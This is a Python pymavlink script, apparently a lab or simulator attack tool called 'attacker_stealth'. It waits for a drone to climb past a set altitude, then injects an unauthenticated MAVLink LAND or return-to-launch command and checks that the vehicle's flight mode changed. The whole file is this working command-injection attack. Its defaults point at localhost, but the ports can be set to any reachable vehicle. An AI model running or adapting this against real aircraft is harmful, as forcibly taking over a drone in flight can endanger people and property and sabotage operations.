import time
import argparse
from pymavlink import mavutil


def mode_str(hb):
    try:
        return mavutil.mode_string_v10(hb)
    except Exception:
        return f"Mode(base={getattr(hb, 'base_mode', None)}, custom={getattr(hb, 'custom_mode', None)})"


def send_cmd_land(cmd, target_sys, target_comp):
    cmd.mav.command_long_send(
        target_sys, target_comp,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0,  # confirmation
        0, 0, 0, 0, 0, 0, 0
    )


def send_cmd_rtl(cmd, target_sys, target_comp):
    cmd.mav.command_long_send(
        target_sys, target_comp,
        mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
        0,  # confirmation
        0, 0, 0, 0, 0, 0, 0
    )


def wait_for_mode(tel, want_substr: str, timeout_s: float, filter_autopilot=True):
    """
    Wait until HEARTBEAT mode string contains want_substr (e.g. "LAND", "RTL").
    """
    end = time.time() + timeout_s
    last = None
    while time.time() < end:
        hb = tel.recv_match(type="HEARTBEAT", blocking=True, timeout=0.5)
        if not hb:
            continue
        if filter_autopilot and (hb.get_srcSystem() != 1 or hb.get_srcComponent() != 1):
            continue

        m = mode_str(hb)
        if m != last:
            print(f"MODE => {m}")
            last = m
        if want_substr.upper() in m.upper():
            return True, m
    return False, last


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--tel-port", type=int, default=14540, help="Telemetry listen port (PX4 remote onboard port)")
    ap.add_argument("--cmd-port", type=int, default=14580, help="Command send port (PX4: 14580; ArduPilot GCS: 14550)")
    ap.add_argument("--trigger-alt", type=float, default=3.0, help="Trigger altitude in meters")
    ap.add_argument("--action", choices=["LAND", "RTL"], default="LAND", help="Attack action")
    ap.add_argument("--verify-timeout", type=float, default=5.0, help="Seconds to wait for mode change proof")
    args = ap.parse_args()

    print(f"📡 Telemetry listen: udp:127.0.0.1:{args.tel_port}")
    tel = mavutil.mavlink_connection(f"udp:127.0.0.1:{args.tel_port}")
    tel.wait_heartbeat()
    print("✅ Telemetry connected (heartbeat received)")

    print(f"🎯 Command send: udpout:127.0.0.1:{args.cmd_port}")
    cmd = mavutil.mavlink_connection(f"udpout:127.0.0.1:{args.cmd_port}")

    TARGET_SYS = 1
    TARGET_COMP = 1

    print(f"🕵️ Waiting for trigger: alt_m > {args.trigger_alt} ...")
    while True:
        msg = tel.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1)
        if not msg:
            continue
        alt_m = msg.relative_alt / 1000.0
        if alt_m > args.trigger_alt:
            print(f"🚨 Trigger met (alt={alt_m:.2f}m). Injecting {args.action} via cmd-port {args.cmd_port}!")
            break

    if args.action == "LAND":
        send_cmd_land(cmd, TARGET_SYS, TARGET_COMP)
        want = "LAND"
    else:
        send_cmd_rtl(cmd, TARGET_SYS, TARGET_COMP)
        want = "RTL"

    # PROOF: watch heartbeats for mode change
    ok, final_mode = wait_for_mode(tel, want_substr=want, timeout_s=args.verify_timeout, filter_autopilot=True)
    if ok:
        print(f"✅ VERIFIED: vehicle entered {want} mode ({final_mode})")
    else:
        print(f"⚠️ NOT VERIFIED: did not observe mode containing '{want}' within {args.verify_timeout}s.")
        print("   Try switching cmd port:")
        print("     python3 attacker_stealth.py --cmd-port 14580 --action LAND --trigger-alt 3")


if __name__ == "__main__":
    main()
